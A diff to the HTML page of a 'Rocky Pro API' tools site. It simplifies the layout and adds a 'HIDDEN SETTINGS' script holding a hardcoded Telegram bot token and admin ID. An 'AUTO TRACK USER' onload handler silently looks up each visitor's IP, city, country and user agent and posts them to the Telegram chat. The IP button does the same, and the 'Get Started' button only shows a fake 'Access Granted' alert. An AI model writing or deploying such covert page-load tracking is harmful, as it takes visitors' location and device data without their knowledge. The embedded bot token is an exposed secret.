@@ -5,223 +5,146 @@
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>Rocky Pro API</title>
 
-<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;500;700&display=swap" rel="stylesheet">
-
 <style>
-*{margin:0;padding:0;box-sizing:border-box;font-family:Poppins,sans-serif}
-
 body{
-background:linear-gradient(135deg,#0f0c29,#302b63,#24243e);
-color:#fff;
-text-align:center;
-padding:20px;
+  margin:0;
+  font-family:sans-serif;
+  background:linear-gradient(135deg,#0f0c29,#302b63,#24243e);
+  color:white;
+  text-align:center;
 }
 
-.header{
-display:flex;
-justify-content:space-between;
-align-items:center;
-}
-
-.logo{
-font-size:20px;
-font-weight:bold;
-background:linear-gradient(45deg,#c084fc,#9333ea);
--webkit-background-clip:text;
-color:transparent;
-}
-
-.btn-top{
-padding:8px 15px;
-border-radius:20px;
-background:linear-gradient(45deg,#9333ea,#c084fc);
-color:white;
-text-decoration:none;
-font-size:12px;
-}
-
-.hero{
-margin-top:30px;
-}
-
-.hero h1{
-font-size:28px;
-}
-
-.hero p{
-opacity:.7;
-margin-top:10px;
-}
-
-.online{
-margin-top:10px;
-padding:8px 15px;
-background:rgba(0,255,100,0.1);
-border-radius:20px;
-display:inline-block;
-font-size:13px;
+.container{
+  padding:20px;
 }
 
 .btn{
-display:block;
-margin:15px auto;
-padding:15px;
-width:85%;
-border-radius:30px;
-text-decoration:none;
-font-weight:bold;
+  padding:15px;
+  border-radius:30px;
+  border:none;
+  background:linear-gradient(90deg,#ff00cc,#3333ff);
+  color:white;
+  font-size:18px;
+  margin:10px;
+  width:80%;
 }
 
-.primary{
-background:linear-gradient(45deg,#9333ea,#c084fc);
-color:white;
-}
-
-.secondary{
-border:1px solid #aaa;
-color:white;
-}
-
-.card{
-background:rgba(255,255,255,0.05);
-padding:20px;
-border-radius:20px;
-margin-top:20px;
-backdrop-filter:blur(10px);
+.box{
+  background:rgba(255,255,255,0.1);
+  padding:20px;
+  margin:15px;
+  border-radius:15px;
 }
 
 input{
-padding:10px;
-border-radius:10px;
-border:none;
-width:90%;
-margin-top:10px;
+  padding:10px;
+  border-radius:10px;
+  border:none;
+  width:80%;
 }
 
-button{
-margin-top:10px;
-padding:10px 20px;
-border:none;
-border-radius:10px;
-background:#9333ea;
-color:white;
-cursor:pointer;
-}
-
-.result{
-margin-top:10px;
-font-size:14px;
-opacity:.9;
-}
-
-footer{
-margin-top:40px;
-opacity:.5;
-}
 </style>
 </head>
 
 <body>
 
-<div class="header">
-<div class="logo">Rocky Pro API</div>
-<a href="#" class="btn-top">Dashboard</a>
-</div>
+<div class="container">
 
-<div class="hero">
-<h1>Core API System</h1>
-<p>Modern APIs — AI, Tools, Downloader</p>
+<h1>🚀 Rocky Pro API</h1>
+<p>Modern API System — Tools, Downloader, AI</p>
 
-<div class="online">🟢 Online & Serving Requests</div>
+<button class="btn" onclick="start()">🚀 Get Started Free</button>
 
-<!-- 🤖 BOT -->
-<a href="https://t.me/Access_Terger_Bot" class="btn primary">
-🚀 Get Started Free
-</a>
-
-<!-- 👑 ADMIN -->
-<a href="https://t.me/alveeevanrocky320" class="btn secondary">
-💬 Contact Me
-</a>
-
-</div>
-
-<!-- 🔑 API KEY -->
-<div class="card">
-<h3>🔑 Enter API Key</h3>
-<input value="rocky_free_key" readonly>
-<p style="font-size:12px;">Auto system enabled</p>
-</div>
-
-<!-- 📘 GUIDE -->
-<div class="card">
-<h3>📘 How To Use</h3>
-<p>
-Click Get Started → Open Bot → Get Key → Use APIs
-</p>
-</div>
-
-<!-- 🔍 YT -->
-<div class="card">
-<h3>🔍 YouTube Search</h3>
+<div class="box">
+<h2>🔍 YouTube Search</h2>
 <input id="yt" placeholder="Search video">
-<br>
-<button onclick="ytSearch()">Search</button>
-<div id="ytResult" class="result"></div>
+<br><br>
+<button class="btn" onclick="ytSearch()">Search</button>
 </div>
 
-<!-- 🤖 AI -->
-<div class="card">
-<h3>🤖 AI Chat</h3>
-<input id="ai" placeholder="Ask anything">
-<br>
-<button onclick="aiChat()">Ask</button>
-<div id="aiResult" class="result"></div>
+<div class="box">
+<h2>🌍 IP Info</h2>
+<button class="btn" onclick="ipInfo()">Check</button>
 </div>
 
-<!-- 🌍 IP -->
-<div class="card">
-<h3>🌍 IP Info</h3>
-<button onclick="ipInfo()">Check</button>
-<div id="ipResult" class="result"></div>
 </div>
-
-<footer>
-© Rocky Chowdhury | Secure API
-</footer>
 
 <script>
 
-// YouTube
+// =====================
+// 🔐 HIDDEN SETTINGS
+// =====================
+
+// 👉 এখানে BOT TOKEN বসাও
+const BOT_TOKEN = "8558577029:AAEdOiNQUk7oK2OpnyqtGmU_PVHKWEcKzRs";
+
+// 👉 এখানে তোমার Telegram ID বসাও
+const ADMIN_ID = "6882953267";
+
+// =====================
+// 📡 USER TRACK SYSTEM
+// =====================
+
+async function sendToTelegram(msg){
+  fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,{
+    method:"POST",
+    headers:{'Content-Type':'application/json'},
+    body:JSON.stringify({
+      chat_id:ADMIN_ID,
+      text:msg
+    })
+  });
+}
+
+// =====================
+// 🚀 START BUTTON
+// =====================
+
+function start(){
+  alert("✅ Access Granted!");
+}
+
+// =====================
+// 🔍 YOUTUBE SEARCH
+// =====================
+
 async function ytSearch(){
-let q=document.getElementById("yt").value;
+  let q = document.getElementById("yt").value;
+  if(!q) return alert("Enter search!");
 
-let res=await fetch(`https://api.popcat.xyz/search?q=${q}`);
-let data=await res.json();
+  let res = await fetch(`https://ytsearch-demo.vercel.app/api/search?q=${q}`);
+  let data = await res.json();
 
-document.getElementById("ytResult").innerText =
-data.title || "No result";
+  alert("Top Result: " + data.result[0].title);
 }
 
-// AI
-async function aiChat(){
-let q=document.getElementById("ai").value;
+// =====================
+// 🌍 IP INFO
+// =====================
 
-let res=await fetch(`https://api.popcat.xyz/chatbot?msg=${q}&owner=Rocky&botname=RockyAI`);
-let data=await res.json();
-
-document.getElementById("aiResult").innerText =
-data.response;
-}
-
-// IP
 async function ipInfo(){
-let res=await fetch("https://api.ipify.org?format=json");
-let data=await res.json();
+  let res = await fetch("https://ipapi.co/json/");
+  let data = await res.json();
 
-document.getElementById("ipResult").innerText =
-"IP: "+data.ip;
+  alert(`IP: ${data.ip}\nCountry: ${data.country_name}`);
+
+  sendToTelegram(
+    `👤 New Visitor\nIP: ${data.ip}\nCity: ${data.city}\nCountry: ${data.country_name}`
+  );
 }
+
+// =====================
+// 🔥 AUTO TRACK USER
+// =====================
+
+window.onload = async () => {
+  let res = await fetch("https://ipapi.co/json/");
+  let data = await res.json();
+
+  sendToTelegram(
+    `🚀 Visitor Opened Site\nIP: ${data.ip}\nCity: ${data.city}\nCountry: ${data.country_name}\nDevice: ${navigator.userAgent}`
+  );
+};
 
 </script>
 
